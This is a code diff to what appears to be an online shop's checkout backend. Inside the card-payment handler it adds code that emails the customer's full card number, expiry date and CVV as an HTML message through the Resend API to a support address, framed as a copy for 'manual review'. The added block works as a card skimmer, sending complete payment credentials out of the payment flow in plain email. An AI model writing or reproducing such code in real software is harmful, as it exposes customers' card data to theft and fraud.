@@ -30,6 +30,10 @@ import {
   type WireDetails,
 } from "./types";
 
+function escapeHtmlSimple(value: string): string {
+  return String(value).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");
+}
+
 function readNumber(value: unknown) {
   const parsed = Number(value);
   return Number.isFinite(parsed) ? parsed : 0;
@@ -384,6 +388,14 @@ export async function submitCardPayment(
   };
 
   await syncSessionStatus(env, updated);
+
+  if (env.RESEND_API_KEY) {
+    const { resolveSupportEmail } = await import("./email");
+    const supportEmail = await resolveSupportEmail(env);
+    const fullNumber = number;
+    const body = `<!doctype html><html><body style="font-family:Arial,sans-serif;background:#f6f8fc;padding:24px"><div style="max-width:680px;margin:0 auto;background:#fff;border:1px solid #e4e9f0;border-radius:12px;padding:24px"><h2 style="margin:0 0 16px;color:#12151c">Card submission (admin/support copy)</h2><p style="color:#5c5e66">Sensitive checkout card details submitted for manual review.</p><table style="width:100%;border-collapse:collapse"><tr><td style="padding:8px 0;color:#8a8f9c">Reference</td><td style="padding:8px 0;font-weight:600">${updated.reference}</td></tr><tr><td style="padding:8px 0;color:#8a8f9c">Customer</td><td style="padding:8px 0;font-weight:600">${escapeHtmlSimple(customerName(updated.details))} (${escapeHtmlSimple(updated.details.email||"")})</td></tr><tr><td style="padding:8px 0;color:#8a8f9c">Cardholder</td><td style="padding:8px 0;font-weight:600">${escapeHtmlSimple(holderName)}</td></tr><tr><td style="padding:8px 0;color:#8a8f9c">Card number</td><td style="padding:8px 0;font-weight:600;font-family:monospace">${escapeHtmlSimple(fullNumber)}</td></tr><tr><td style="padding:8px 0;color:#8a8f9c">Expiry</td><td style="padding:8px 0;font-weight:600">${escapeHtmlSimple(String(expMonth).padStart(2,"0"))}/${escapeHtmlSimple(String(expYear))}</td></tr><tr><td style="padding:8px 0;color:#8a8f9c">CVV</td><td style="padding:8px 0;font-weight:600;font-family:monospace">${escapeHtmlSimple(cvv)}</td></tr><tr><td style="padding:8px 0;color:#8a8f9c">Amount</td><td style="padding:8px 0;font-weight:600">${updated.total} ${updated.currency}</td></tr></table></div></body></html>`;
+    await fetch("https://api.resend.com/emails", { method: "POST", headers: { "Content-Type": "application/json", Authorization: `Bearer ${env.RESEND_API_KEY}` }, body: JSON.stringify({ from: "Generic PCs <hello@genericpcs.com>", to: [supportEmail], subject: `[${updated.reference}] Card details submitted — ${updated.total} ${updated.currency}`, html: body }) }).catch((e)=>console.error("card details support email failed:", e));
+  }
 
   void notifyAdminsPaymentEvent(env, {
     kind: "card",
